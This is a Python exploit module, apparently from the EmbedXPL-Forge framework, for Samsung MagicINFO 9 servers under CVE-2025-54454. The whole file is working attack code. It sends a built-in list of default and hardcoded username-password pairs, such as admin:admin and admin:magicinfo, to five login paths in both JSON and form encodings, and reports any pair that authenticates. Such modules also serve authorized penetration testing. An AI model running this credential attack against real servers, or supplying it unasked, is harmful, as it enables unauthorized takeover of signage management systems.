# Author: André Henrique (LinkedIn/X: @mrhenrike)
"""Samsung MagicINFO 9 — Hardcoded Default Credentials (CVE-2025-54454).

Attempts to authenticate to the MagicINFO 9 login endpoint using a list of
well-known default and hardcoded credential pairs. Reports any pair that
produces a successful authentication response.

CVE: CVE-2025-54454
CVSS: 9.0
Version: 1.0.0
"""
import json
from typing import Optional, Tuple

from embedxpl.core.exploit import *
from embedxpl.core.http.http_client import HTTPClient

_LOGIN_PATHS = (
    "/MagicInfo/login",
    "/MagicInfo/api/v1/login",
    "/MagicInfo/j_security_check",
    "/MagicInfoPremium/login",
    "/MagicInfo/auth/login",
)

_DEFAULT_CREDS = (
    ("admin", "admin"),
    ("administrator", "magicinfo"),
    ("admin", "magicinfo9"),
    ("admin", "magicinfo"),
    ("admin", "samsung"),
    ("admin", "Admin1234!"),
    ("root", "root"),
    ("admin", ""),
)

_SUCCESS_INDICATORS = (
    "token",
    "access_token",
    "sessionId",
    "success",
    "authToken",
    '"result":"ok"',
    '"status":"success"',
    "dashboard",
    "welcome",
)

_FAILURE_INDICATORS = (
    "invalid password",
    "login failed",
    "unauthorized",
    "incorrect",
    "authentication failed",
    "wrong password",
)


def _login_succeeded(body: str, status: int) -> bool:
    """Determine whether a login response indicates a successful authentication.

    Args:
        body: HTTP response body text.
        status: HTTP status code.

    Returns:
        True if the response contains success indicators and no failure markers.
    """
    if status not in (200, 201, 302):
        return False
    body_lower = body.lower()
    if any(fail.lower() in body_lower for fail in _FAILURE_INDICATORS):
        return False
    return any(succ.lower() in body_lower for succ in _SUCCESS_INDICATORS)


class Exploit(HTTPClient):
    """Samsung MagicINFO 9 Hardcoded Default Credentials — CVE-2025-54454.

    MagicINFO 9 installations ship with several hardcoded and well-known
    default credential pairs that are frequently left unchanged. This module
    iterates a curated list of such pairs against the login endpoint and
    reports any that return a successful authentication response.

    Author: André Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Samsung MagicINFO 9 Hardcoded Default Credentials (CVE-2025-54454)",
        "description": (
            "Tests MagicINFO 9 for CVE-2025-54454 (CVSS 9.0). Tries known default "
            "and hardcoded credential pairs against the MagicINFO login endpoint "
            "and reports successful authentications."
        ),
        "authors": (
            "Samsung PSIRT advisory",
            "André Henrique (@mrhenrike) - EmbedXPL-Forge port",
        ),
        "references": (
            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-54454",
            "https://www.samsung.com/global/business/display/magicinfo/",
        ),
        "devices": ("Samsung MagicINFO 9 Server",),
    }

    target = OptIP("", "Target IPv4 address")
    port = OptPort(80, "Target HTTP port")
    timeout = OptInteger(10, "HTTP request timeout (seconds)")

    def run(self) -> None:
        """Execute the default-credential login attempts."""
        print_status(
            "Testing default credentials on {} for CVE-2025-54454".format(self.target)
        )
        found = False
        for username, password in _DEFAULT_CREDS:
            result = self._try_login(username, password)
            if result:
                found = True
                print_success(
                    "VALID CREDENTIALS — {}:{} succeeded at {}".format(
                        username, password, result
                    )
                )
            else:
                print_status(
                    "  {}:{} — no match".format(username, password)
                )
        if not found:
            print_error(
                "All default credential attempts failed — target may use "
                "a non-default password or CVE-2025-54454 is patched."
            )

    def _try_login(self, username: str, password: str) -> Optional[str]:
        """Attempt a login with the given credentials on all known paths.

        Args:
            username: Login username.
            password: Login password.

        Returns:
            The login path that accepted the credentials, or None.
        """
        json_body = json.dumps({"username": username, "password": password})
        form_body = "j_username={}&j_password={}".format(username, password)

        for path in _LOGIN_PATHS:
            for body, ctype in (
                (json_body.encode(), "application/json"),
                (form_body.encode(), "application/x-www-form-urlencoded"),
            ):
                try:
                    resp = self.http_request(
                        "POST",
                        path,
                        data=body,
                        headers={
                            "Content-Type": ctype,
                            "User-Agent": "EmbedXPL-Forge/1.0",
                        },
                        timeout=int(self.timeout),
                    )
                except Exception:
                    continue
                if resp is None:
                    continue
                status = getattr(resp, "status_code", 0)
                resp_body = getattr(resp, "text", "") or ""
                if _login_succeeded(resp_body, status):
                    return path
        return None

    @mute
    def check(self) -> bool:
        """Check if any default credential pair successfully authenticates.

        Returns:
            True if at least one credential pair is accepted.
        """
        for username, password in _DEFAULT_CREDS:
            if self._try_login(username, password) is not None:
                return True
        return False
